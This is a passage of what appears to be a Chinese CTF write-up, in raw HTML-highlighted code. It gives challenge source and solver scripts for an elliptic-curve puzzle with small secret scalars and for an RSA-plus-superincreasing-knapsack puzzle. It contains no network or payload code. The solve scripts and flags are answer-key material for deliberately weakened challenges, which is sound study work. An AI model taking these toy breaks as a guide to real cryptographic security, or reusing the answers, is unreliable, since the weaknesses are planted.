keyword\">import</span> nextprime\n<span class=\"token keyword\">def</span> <span class=\"token function\">part1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> random_prime<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token number\">512</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token number\">513</span><span class=\"token punctuation\">)</span>\n    a <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    b <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token number\">4</span> <span class=\"token operator\">*</span> a<span class=\"token operator\">**</span><span class=\"token number\">3</span> <span class=\"token operator\">+</span> <span class=\"token number\">27</span> <span class=\"token operator\">*</span> b<span class=\"token operator\">**</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> p <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n        a <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n        b <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\n    E <span class=\"token operator\">=</span> EllipticCurve<span class=\"token punctuation\">(</span>GF<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\n    P<span class=\"token operator\">=</span>E<span class=\"token punctuation\">.</span>random_point<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    n <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token operator\">**</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> \n    <span class=\"token keyword\">assert</span> part1<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> n<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    cipher <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>n<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> P <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span>\n\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"N = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>p<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"a = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>a<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, b = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>b<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"P = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>P<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"cipher</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>cipher<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">part2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span>  <span class=\"token number\">839252355769732556552066312852886325703283133710701931092148932185749211043</span>\n    a <span class=\"token operator\">=</span>  <span class=\"token number\">166868889451291853349533652847942310373752202024350091562181659031084638450</span>\n    b <span class=\"token operator\">=</span>  <span class=\"token number\">168504858955716283284333002385667234985259576554000582655928538041193311381</span>\n    P <span class=\"token operator\">=</span> E<span class=\"token punctuation\">.</span>random_point<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    Q <span class=\"token operator\">=</span> key<span class=\"token operator\">*</span>P\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"p = \"</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a = \"</span><span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"b = \"</span><span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"P = \"</span><span class=\"token punctuation\">,</span>P<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Q = \"</span><span class=\"token punctuation\">,</span>Q<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">assert</span> part2<span class=\"token operator\">=</span>key\n\npart1<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"-------------------------------------------\"</span><span class=\"token punctuation\">)</span>\npart2<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">assert</span> flag<span class=\"token operator\">=</span><span class=\"token string\">\"flag&#123;\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>part1<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\"-\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>part2<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\"&#125;\"</span></code></pre>\n\n<p>part1：发现n &#x3D; [random.randint(1, 2**20) for _ in range(3)] ，在可以爆破的范围，直接爆破出n即可</p>\n<p>part2：数字较小直接求离散对数即可</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\">N <span class=\"token operator\">=</span> <span class=\"token number\">8186762541745429544201163537921168767557829030115874801599552603320381728161132002130533050721684554609459754424458805702284922582219134865036743485620797</span>\na <span class=\"token operator\">=</span> <span class=\"token number\">1495420997701481377470828570661032998514190598989197201754979317255564287604311958150666812378959018880028977121896929545639701195491870774156958755735447</span>\nb <span class=\"token operator\">=</span> <span class=\"token number\">5991466901412408757938889677965118882508317970919705053385317474407117921506012065861844241307270755999163280442524251782766457119443496954015171881396147</span>\nE1 <span class=\"token operator\">=</span> EllipticCurve<span class=\"token punctuation\">(</span>GF<span class=\"token punctuation\">(</span>N<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\nP <span class=\"token operator\">=</span> E1<span class=\"token punctuation\">(</span><span class=\"token number\">6053058761132539206566092359337778642106843252217768817197593657660613775577674830119685211727923302909194735842939382758409841779476679807381619373546323</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">7059796954840479182074296506322819844555365317950589431690683736872390418673951275875742138479119268529134101923865062199776716582160225918885119415223226</span> <span class=\"token punctuation\">)</span>\n\ncipher0 <span class=\"token operator\">=</span> E1<span class=\"token punctuation\">(</span><span class=\"token number\">4408587937721811766304285221308758024881057826193901720202053016482471785595442728924925855745045433966244594468163087104593409425316538804577603801023861</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">5036207336371623412617556622231677184152618465739959524167001889273208946091746905245078901669335908442289383798546066844566618503786766455892065155724816</span> <span class=\"token punctuation\">)</span>\ncipher1 <span class=\"token operator\">=</span> E1<span class=\"token punctuation\">(</span><span class=\"token number\">2656427748146837510897512086140712942840881743356863380855689945832188909581954790770797146584513962618190767634822273749569907212145053676352384889228875</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">4010263650619965046904980178893999473955022015118149348183137418914551275841596653682626506158128955577872592363930977349664669161585732323838763793957500</span> <span class=\"token punctuation\">)</span>\ncipher2 <span class=\"token operator\">=</span> E1<span class=\"token punctuation\">(</span><span class=\"token number\">1836350123050832793309451054411760401335561429787905037706697802971381859410503854213212757333551949694177845513529651742217132039482986693213175074097638</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">1647556471109115097539227566131273446643532340029032358996281388864842086424490493200350147689138143951529796293632149050896423880108194903604646084656434</span> <span class=\"token punctuation\">)</span>\ncipher<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span>cipher0<span class=\"token punctuation\">,</span>cipher1<span class=\"token punctuation\">,</span>cipher2<span class=\"token punctuation\">]</span>\n<span class=\"token triple-quoted-string string\">'''n=[]\nfrom tqdm import tqdm\nfor k in tqdm(range(2**12,2**20)):\n    if k*P in cipher:\n            n.append(int(k))\n    if len(n)==3:\n        break\n\nprint(n)'''</span>\nn<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">651602</span><span class=\"token punctuation\">,</span> <span class=\"token number\">943532</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1008061</span><span class=\"token punctuation\">]</span>\npart1<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> n<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>part1<span class=\"token punctuation\">)</span>\n\np2 <span class=\"token operator\">=</span>  <span class=\"token number\">839252355769732556552066312852886325703283133710701931092148932185749211043</span>\na2 <span class=\"token operator\">=</span>  <span class=\"token number\">166868889451291853349533652847942310373752202024350091562181659031084638450</span>\nb2 <span class=\"token operator\">=</span>  <span class=\"token number\">168504858955716283284333002385667234985259576554000582655928538041193311381</span>\nE2 <span class=\"token operator\">=</span> EllipticCurve<span class=\"token punctuation\">(</span>GF<span class=\"token punctuation\">(</span>p2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>a2<span class=\"token punctuation\">,</span> b2<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\nP2 <span class=\"token operator\">=</span>  E2<span class=\"token punctuation\">(</span><span class=\"token number\">547842233959736088159936218561804098153493246314301816190854370687622130932</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">259351987899983557442340376413545600148150183183773375317113786808135411950</span><span class=\"token punctuation\">)</span>\nQ <span class=\"token operator\">=</span>  E2<span class=\"token punctuation\">(</span><span class=\"token number\">52509027983019069214323702207915994504051708473855890224511139305828303028</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">520507172059483331872189759719244369795616990414416040196069632909579234481</span><span class=\"token punctuation\">)</span>\n\nkey<span class=\"token operator\">=</span>P2<span class=\"token punctuation\">.</span>discrete_log<span class=\"token punctuation\">(</span>Q<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nkey1<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span>  <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>cipher<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> n<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>P<span class=\"token operator\">==</span>cipher<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span>\n            key1<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>n<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>key1<span class=\"token punctuation\">)</span>\n\npart1<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> key1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\nflag<span class=\"token operator\">=</span><span class=\"token string\">\"flag&#123;\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>part1<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\"-\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\"&#125;\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></code></pre>\n\n<h3 id=\"Ez-Calculate-ucsc\"><a href=\"#Ez-Calculate-ucsc\" class=\"headerlink\" title=\"Ez_Calculate-ucsc\"></a><strong>Ez_Calculate-ucsc</strong></h3><pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> random <span class=\"token keyword\">import</span> randint\n<span class=\"token keyword\">from</span> hashlib <span class=\"token keyword\">import</span> md5\n\nflag1 <span class=\"token operator\">=</span> <span class=\"token string\">b'xxx'</span>\nflag2 <span class=\"token operator\">=</span> <span class=\"token string\">b'xxx'</span>\nFlags <span class=\"token operator\">=</span> <span class=\"token string\">'flag&#123;'</span> <span class=\"token operator\">+</span> md5<span class=\"token punctuation\">(</span>flag1<span class=\"token operator\">+</span>flag2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token string\">'&#125;'</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">backpack_encrypt_flag</span><span class=\"token punctuation\">(</span>flag_bytes<span class=\"token punctuation\">,</span> M<span class=\"token punctuation\">,</span> group_len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    bits <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">for</span> byte <span class=\"token keyword\">in</span> flag_bytes<span class=\"token punctuation\">:</span>\n        bits<span class=\"token punctuation\">.</span>extend<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> b <span class=\"token keyword\">in</span> <span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>byte<span class=\"token punctuation\">,</span> <span class=\"token string\">\"08b\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">while</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>bits<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> group_len <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n        bits<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\n    S_list <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>bits<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> group_len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        group <span class=\"token operator\">=</span> bits<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span>i <span class=\"token operator\">+</span> group_len<span class=\"token punctuation\">]</span>\n        S <span class=\"token operator\">=</span> <span class=\"token builtin\">sum</span><span class=\"token punctuation\">(</span>bit <span class=\"token operator\">*</span> m <span class=\"token keyword\">for</span> bit<span class=\"token punctuation\">,</span> m <span class=\"token keyword\">in</span> <span class=\"token builtin\">zip</span><span class=\"token punctuation\">(</span>group<span class=\"token punctuation\">,</span> M<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        S_list<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>S<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> S_list\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">backpack</span><span class=\"token punctuation\">(</span>flag_bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    R <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">while</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>R<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">:</span>\n        next_val <span class=\"token operator\">=</span> randint<span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token operator\">*</span> R<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> R<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        R<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>next_val<span class=\"token punctuation\">)</span>\n    B <span class=\"token operator\">=</span> randint<span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token operator\">*</span> R<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> R<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    A <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span>\n    M <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>A <span class=\"token operator\">*</span> ri <span class=\"token operator\">%</span> B <span class=\"token keyword\">for</span> ri <span class=\"token keyword\">in</span> R<span class=\"token punctuation\">]</span>\n    S_list <span class=\"token operator\">=</span> backpack_encrypt_flag<span class=\"token punctuation\">(</span>flag_bytes<span class=\"token punctuation\">,</span> M<span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>M<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> R<span class=\"token punctuation\">,</span> A<span class=\"token punctuation\">,</span> B<span class=\"token punctuation\">,</span> M<span class=\"token punctuation\">,</span> S_list\n\np <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span>\nq <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span>\nn <span class=\"token operator\">=</span> p<span class=\"token operator\">*</span>q\ne <span class=\"token operator\">=</span> <span class=\"token number\">0x10000</span>\nm <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>flag1<span class=\"token punctuation\">)</span>\nk <span class=\"token operator\">=</span> randint<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">999</span><span class=\"token punctuation\">)</span>\nproblem1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> n\nproblem2 <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span>q<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>k<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span>\nc <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span>\n\nR<span class=\"token punctuation\">,</span> A<span class=\"token punctuation\">,</span> B<span class=\"token punctuation\">,</span> M<span class=\"token punctuation\">,</span> S_list <span class=\"token operator\">=</span> backpack<span class=\"token punctuation\">(</span>flag2<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">r\"C:\\Users\\Rebirth\\Desktop\\data.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"w\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n    f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"problem1 = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>problem1<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\\n\"</span></span><span class=\"token punctuation\">)</span>\n    f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"problem2 = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>problem2<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\\n\"</span></span><span class=\"token punctuation\">)</span>\n    f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"n = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>n<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\\n\"</span></span><span class=\"token punctuation\">)</span>\n    f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"c = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>c<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\\n\"</span></span><span class=\"token punctuation\">)</span>\n    f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">\"-------------------------\\n\"</span><span class=\"token punctuation\">)</span>\n    f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"R = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>R<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\\n\"</span></span><span class=\"token punctuation\">)</span>\n    f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"A = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>A<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\\n\"</span></span><span class=\"token punctuation\">)</span>\n    f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"B = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>B<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\\n\"</span></span><span class=\"token punctuation\">)</span>\n    f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"M = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>M<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\\n\"</span></span><span class=\"token punctuation\">)</span>\n    f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"S_list = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>S_list<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\\n\"</span></span><span class=\"token punctuation\">)</span>\n    f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">\"-------------------------\\n\"</span><span class=\"token punctuation\">)</span>\n    f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"What you need to submit is Flags!\\n\"</span></span><span class=\"token punctuation\">)</span></code></pre>\n\n<p>分两部分，第一部分e&#x3D;2**16，使用Tonelli–Shanks以及中国剩余定理求解m</p>\n<p>第二部分是普通的超递增背包，求解即可</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> random <span class=\"token keyword\">import</span> randint\n<span class=\"token keyword\">from</span> hashlib <span class=\"token keyword\">import</span> md5\n\ne<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10000</span><span class=\"token punctuation\">)</span>\nproblem1 <span class=\"token operator\">=</span> <span class=\"token 